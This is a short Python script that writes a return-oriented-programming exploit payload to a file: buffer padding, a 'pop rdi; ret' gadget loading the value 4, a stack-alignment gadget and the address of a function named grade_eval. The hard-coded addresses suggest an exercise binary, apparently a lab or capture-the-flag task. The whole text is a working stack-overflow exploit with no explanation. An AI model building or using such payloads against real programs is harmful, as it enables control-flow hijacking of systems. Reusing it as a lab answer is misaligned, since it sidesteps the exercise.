import struct

grade_eval  = 0x401978
pop_rdi_ret = 0x401a33
ret_gadget  = 0x401a34

payload  = b'A' * 24
payload += struct.pack('<Q', pop_rdi_ret)
payload += struct.pack('<Q', 4)
payload += struct.pack('<Q', ret_gadget)
payload += struct.pack('<Q', grade_eval)
payload += b'\n'

with open('payload_rop', 'wb') as f:
    f.write(payload)

print("Payload generated!")